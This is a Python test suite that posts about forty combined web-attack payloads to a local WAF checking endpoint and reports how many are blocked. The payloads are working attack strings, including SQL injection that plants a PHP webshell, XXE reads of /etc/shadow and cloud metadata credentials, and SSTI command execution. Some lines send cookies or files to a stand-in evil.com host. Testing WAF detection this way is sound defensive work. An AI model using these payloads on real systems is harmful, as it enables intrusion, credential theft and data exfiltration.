#!/usr/bin/env python3
"""
Mixed & Blended Attack Test Suite
Tests complex attacks combining multiple techniques against the WAF
These simulate real-world attack scenarios with multiple vectors
"""

import requests
import json
import time
from typing import Dict

WAF_API = "http://localhost:3001/api/waf/check"

# Mixed/Blended Attack Payloads - Combining multiple attack vectors
MIXED_ATTACKS = [
    # SQL Injection + XSS Combo
    {
        "name": "SQLi + XSS in search",
        "path": "/api/products/search",
        "query": {"q": "' UNION SELECT '<script>alert(document.cookie)</script>',2,3--"},
        "desc": "SQL injection to inject XSS payload"
    },
    {
        "name": "SQLi + XSS in comment",
        "path": "/api/comments",
        "body": {"text": "Great!' OR 1=1; UPDATE posts SET content='<img src=x onerror=alert(1)>';--"},
        "desc": "Stored XSS via SQL injection"
    },
    {
        "name": "SQLi + Cmd injection",
        "path": "/api/export",
        "query": {"table": "users; COPY (SELECT * FROM users) TO PROGRAM 'curl http://evil.com/exfil'"},
        "desc": "SQL injection leading to command execution"
    },

    # XSS + SSRF Combo
    {
        "name": "XSS + SSRF via img",
        "path": "/api/render",
        "body": {"html": "<img src='http://169.254.169.254/latest/meta-data/' onerror='alert(1)'>"},
        "desc": "SSRF attempt with XSS fallback"
    },
    {
        "name": "XSS + SSRF in iframe",
        "path": "/api/preview",
        "body": {"content": "<iframe src='http://localhost/admin' onload='fetch(this.src).then(r=>r.text()).then(alert)'></iframe>"},
        "desc": "SSRF with XSS data exfiltration"
    },

    # Path Traversal + Command Injection
    {
        "name": "LFI + RCE log poison",
        "path": "/api/include",
        "query": {"file": "../../../var/log/apache2/access.log"},
        "headers": {"User-Agent": "<?php system($_GET['cmd']); ?>"},
        "desc": "Log poisoning via User-Agent for RCE"
    },
    {
        "name": "LFI + Cmd via wrapper",
        "path": "/api/read",
        "query": {"file": "php://filter/convert.base64-encode|convert.base64-decode/resource=data://text/plain,<?php system('id');?>"},
        "desc": "PHP wrapper chain for command execution"
    },

    # XXE + SSRF Combo
    {
        "name": "XXE + SSRF metadata",
        "path": "/api/xml/parse",
        "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><data>&xxe;</data>',
        "desc": "XXE to access cloud metadata"
    },
    {
        "name": "XXE + LFI combo",
        "path": "/api/xml/import",
        "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY passwd SYSTEM "file:///etc/passwd"><!ENTITY shadow SYSTEM "file:///etc/shadow">]><data><a>&passwd;</a><b>&shadow;</b></data>',
        "desc": "XXE reading multiple sensitive files"
    },

    # Header Injection + XSS
    {
        "name": "CRLF + XSS response split",
        "path": "/api/redirect",
        "query": {"url": "http://safe.com%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.domain)</script>"},
        "desc": "Response splitting for XSS injection"
    },
    {
        "name": "Header + Cookie steal",
        "path": "/api/callback",
        "query": {"next": "http://app.com%0d%0aSet-Cookie:%20session=evil%0d%0aLocation:%20http://attacker.com/?c="},
        "desc": "Header injection for session hijacking"
    },

    # SSTI + Command Injection
    {
        "name": "SSTI + RCE Jinja2",
        "path": "/api/template/render",
        "body": {"template": "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}", "name": "test"},
        "desc": "Template injection for file read"
    },
    {
        "name": "SSTI + RCE full chain",
        "path": "/api/email/preview",
        "body": {"template": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "to": "test@test.com"},
        "desc": "Template injection for command execution"
    },

    # Authentication Bypass + Privilege Escalation
    {
        "name": "JWT + SQLi bypass",
        "path": "/api/admin/users",
        "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4nIE9SICcxJz0nMSJ9."},
        "desc": "JWT none algorithm with SQL injection"
    },
    {
        "name": "Auth bypass + IDOR",
        "path": "/api/users/1/profile",
        "query": {"id": "1 OR 1=1"},
        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
        "desc": "IP spoofing with IDOR attempt"
    },

    # Multi-stage Attacks
    {
        "name": "Stage1: Recon SQLi",
        "path": "/api/search",
        "query": {"q": "' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--"},
        "desc": "Database enumeration via SQLi"
    },
    {
        "name": "Stage2: Data exfil",
        "path": "/api/search",
        "query": {"q": "' UNION SELECT username,password,3 FROM users--"},
        "desc": "Credential extraction via SQLi"
    },
    {
        "name": "Stage3: RCE attempt",
        "path": "/api/search",
        "query": {"q": "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'--"},
        "desc": "Webshell deployment via SQLi"
    },

    # Polyglot Attacks
    {
        "name": "Polyglot SQLi+XSS+LFI",
        "path": "/api/input",
        "body": {"data": "1'\"-->]]>*/</script></style><script>alert(1)</script><img src=x onerror=alert(1)//../../../etc/passwd"},
        "desc": "Polyglot targeting multiple vulnerabilities"
    },
    {
        "name": "Polyglot all-in-one",
        "path": "/api/process",
        "body": {"input": "{{7*7}}'\"<script>alert(1)</script><!--`--> OR 1=1-- ../../../etc/passwd;id|whoami"},
        "desc": "Kitchen sink polyglot attack"
    },

    # Business Logic + Injection
    {
        "name": "Price manipulation + SQLi",
        "path": "/api/cart/checkout",
        "body": {"product_id": "1; UPDATE products SET price=0.01 WHERE id=1--", "quantity": "-999", "price": "-100"},
        "desc": "Price manipulation with SQLi"
    },
    {
        "name": "Race condition + SQLi",
        "path": "/api/transfer",
        "body": {"from": "attacker", "to": "attacker' OR '1'='1", "amount": "999999"},
        "desc": "SQLi in financial transaction"
    },

    # API Abuse + Injection
    {
        "name": "GraphQL + SQLi",
        "path": "/api/graphql",
        "body": {"query": "{ user(id: \"1' OR '1'='1\") { id email password } }"},
        "desc": "SQL injection via GraphQL"
    },
    {
        "name": "REST + NoSQL injection",
        "path": "/api/users/find",
        "body": {"username": {"$regex": ".*"}, "password": {"$ne": ""}},
        "desc": "NoSQL injection for auth bypass"
    },

    # File Upload + Multiple Vectors
    {
        "name": "Upload + XSS + Path",
        "path": "/api/upload",
        "body": {"filename": "../../../var/www/html/<script>alert(1)</script>.php", "content": "<?php system($_GET['cmd']); ?>"},
        "desc": "Path traversal + XSS + webshell upload"
    },
    {
        "name": "SVG upload + XXE + XSS",
        "path": "/api/image/upload",
        "body": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><script>alert(&xxe;)</script></svg>',
        "desc": "SVG with XXE and XSS"
    },

    # Obfuscated Multi-Vector
    {
        "name": "Base64 SQLi+XSS",
        "path": "/api/decode",
        "query": {"data": "JyBVTklPTiBTRUxFQ1QgJzxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4nLDIsMyAtLQ=="},
        "desc": "Base64 encoded SQLi with XSS"
    },
    {
        "name": "Unicode obfuscated attack",
        "path": "/api/normalize",
        "body": {"input": "\u0027\u0020\u004f\u0052\u0020\u0031\u003d\u0031\u002d\u002d"},
        "desc": "Unicode obfuscated SQLi"
    },
    {
        "name": "Double encoding attack",
        "path": "/api/filter",
        "query": {"q": "%253Cscript%253Ealert(1)%253C%252Fscript%253E%2527%2520OR%25201%253D1--"},
        "desc": "Double URL encoded XSS+SQLi"
    },

    # Chained Vulnerabilities
    {
        "name": "SSRF -> Internal API -> RCE",
        "path": "/api/webhook",
        "body": {"url": "http://127.0.0.1:8080/admin/exec?cmd=id"},
        "desc": "SSRF to internal API command execution"
    },
    {
        "name": "XXE -> SSRF -> Data exfil",
        "path": "/api/xml/process",
        "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % exfil SYSTEM "http://evil.com/?d=%file;">%exfil;]><data/>',
        "desc": "XXE blind exfiltration chain"
    },

    # Evasion Techniques Combined
    {
        "name": "Case + comment evasion",
        "path": "/api/query",
        "query": {"search": "sElEcT/**/password/**/FrOm/**/users/**/WhErE/**/id=1"},
        "desc": "Mixed case with comments"
    },
    {
        "name": "Null byte + encoding",
        "path": "/api/file",
        "query": {"path": "../%00/../%252e%252e/etc/passwd"},
        "desc": "Null byte with double encoding"
    },
    {
        "name": "WAF bypass combo",
        "path": "/api/execute",
        "body": {"cmd": "c%00a%00t%00 /e%00t%00c%00/p%00a%00s%00s%00w%00d"},
        "desc": "Null byte injection to bypass filters"
    },

    # Real-World Attack Simulation
    {
        "name": "E-commerce attack chain",
        "path": "/api/checkout",
        "body": {
            "product": "Widget' UNION SELECT credit_card FROM payments--",
            "quantity": "<script>document.location='http://evil.com?cc='+document.cookie</script>",
            "shipping": "../../../etc/passwd",
            "notes": "{{config.SECRET_KEY}}"
        },
        "desc": "Multi-vector e-commerce attack"
    },
    {
        "name": "Admin panel takeover",
        "path": "/admin/login",
        "body": {"username": "admin'--", "password": "x", "remember": "<script>fetch('http://evil.com?c='+document.cookie)</script>"},
        "headers": {"X-Forwarded-For": "127.0.0.1", "X-Original-URL": "/admin/dashboard"},
        "desc": "Combined auth bypass attempts"
    },
    {
        "name": "API key exfiltration",
        "path": "/api/config/export",
        "query": {"format": "json", "include": "../../../.env,/proc/self/environ"},
        "headers": {"Accept": "application/json", "X-API-Key": "{{process.env.API_KEY}}"},
        "desc": "Environment variable exfiltration"
    },

    # Benign-looking with hidden payloads
    {
        "name": "Hidden in user profile",
        "path": "/api/profile/update",
        "body": {
            "name": "John Smith",
            "email": "john@company.com",
            "bio": "Software engineer with 10 years experience in <script>fetch('http://evil.com/?c='+document.cookie)</script> web development",
            "website": "http://portfolio.com/../../../etc/passwd"
        },
        "desc": "Malicious payload hidden in normal data"
    },
    {
        "name": "Hidden in product review",
        "path": "/api/reviews",
        "body": {
            "rating": 5,
            "title": "Great product!",
            "text": "I love this product!' UNION SELECT username,password FROM users WHERE '1'='1",
            "helpful": True
        },
        "desc": "SQLi hidden in review text"
    },
]

def test_payload(attack: Dict) -> Dict:
    """Test a single mixed attack payload against WAF"""
    payload = {
        "method": "POST" if "body" in attack else "GET",
        "path": attack["path"],
        "query_params": attack.get("query", {}),
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/html, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            **(attack.get("headers", {}))
        }
    }

    body = attack.get("body")
    if body:
        if isinstance(body, (dict, list)):
            try:
                payload["body"] = json.dumps(body)
            except (TypeError, ValueError):
                payload["body"] = str(body)
        else:
            payload["body"] = str(body)

    try:
        response = requests.post(WAF_API, json=payload, timeout=10)
        result = response.json()
        return {
            "name": attack["name"],
            "desc": attack.get("desc", ""),
            "detected": result.get("is_anomaly", False),
            "score": result.get("anomaly_score", 0),
            "time_ms": result.get("processing_time_ms", 0)
        }
    except Exception as e:
        return {"name": attack["name"], "error": str(e)}

def main():
    print("=" * 70)
    print("MIXED & BLENDED ATTACK TEST SUITE")
    print("=" * 70)
    print(f"Testing {len(MIXED_ATTACKS)} complex multi-vector attacks...\n")
    print("These attacks combine multiple techniques like real attackers\n")

    detected = 0
    missed = 0
    errors = 0

    for i, attack in enumerate(MIXED_ATTACKS, 1):
        result = test_payload(attack)

        if "error" in result:
            status = "\033[93m[ERROR]\033[0m"
            errors += 1
        elif result["detected"]:
            status = "\033[92m[BLOCKED]\033[0m"
            detected += 1
        else:
            status = "\033[91m[MISSED]\033[0m"
            missed += 1

        score = result.get("score", 0)
        print(f"[{i:02d}/{len(MIXED_ATTACKS)}] {status} {result['name'][:40]:<40} Score: {score:.4f}")
        time.sleep(0.05)

    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"Total Tests:  {len(MIXED_ATTACKS)}")
    print(f"\033[92mBlocked:      {detected}\033[0m")
    print(f"\033[91mMissed:       {missed}\033[0m")
    print(f"\033[93mErrors:       {errors}\033[0m")
    detection_rate = detected / (len(MIXED_ATTACKS) - errors) * 100 if (len(MIXED_ATTACKS) - errors) > 0 else 0
    print(f"Detection Rate: {detection_rate:.1f}%")
    print("=" * 70)

if __name__ == "__main__":
    main()
